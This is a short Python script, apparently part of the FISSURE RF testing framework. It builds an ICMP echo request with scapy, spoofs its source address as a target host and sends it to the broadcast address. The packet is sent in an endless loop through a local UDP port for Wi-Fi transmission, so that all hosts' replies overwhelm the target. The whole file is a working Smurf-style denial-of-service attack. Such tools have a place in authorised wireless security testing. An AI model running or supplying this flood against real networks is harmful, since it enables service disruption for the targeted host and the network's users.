from scapy.all import IP,LLC,SNAP,ICMP
import socket
import time
import sys

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    target_ip = "192.168.1.10"
    src_ip = "255.255.255.255"
    interval = .1
    wifi_tx_udp_port = 52001
    wifi_tx_ip_address = "127.0.0.1"
    notes = 'Transmits ICMP request messages to all network hosts to make their responses overwhelm the target server. Messages are placed in UDP data and sent to a wifi_tx.py UDP port.'
    arg_names = ['target_ip','src_ip','interval','wifi_tx_udp_port','wifi_tx_ip_address','notes']
    arg_values = [target_ip, src_ip, interval, wifi_tx_udp_port, wifi_tx_ip_address, notes]

    return (arg_names,arg_values)


if __name__ == "__main__":

    # Default Values
    get_target_ip = "192.168.1.10"
    get_src_ip = "255.255.255.255"
    get_interval = .1
    get_wifi_tx_udp_port = 52001
    get_wifi_tx_ip_address = "127.0.0.1"

    # Accept Command Line Arguments
    try:
        get_target_ip = sys.argv[1]
        get_src_ip = sys.argv[2]
        get_interval = float(sys.argv[3])
        get_wifi_tx_udp_port = int(sys.argv[4])
        get_wifi_tx_ip_address = sys.argv[5]
    except:
        pass

#################################################

    # LLC/SNAP/IP/TCP Message in UDP Data -> "wifi_tx.py" Port
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # LLC/SNAP/IP
    pip_bytes = LLC()/SNAP()/IP()/ICMP()
    pip_bytes[IP].src = get_target_ip
    pip_bytes[IP].dst = get_src_ip
    #pip_bytes[IP].id = 0x0000
    #pip_bytes[IP].flags = 2
    final_bytes = str(pip_bytes)
    
    while True:               
        
        # Send
        udp_socket.sendto(final_bytes,(get_wifi_tx_ip_address, get_wifi_tx_udp_port))
        time.sleep(get_interval)
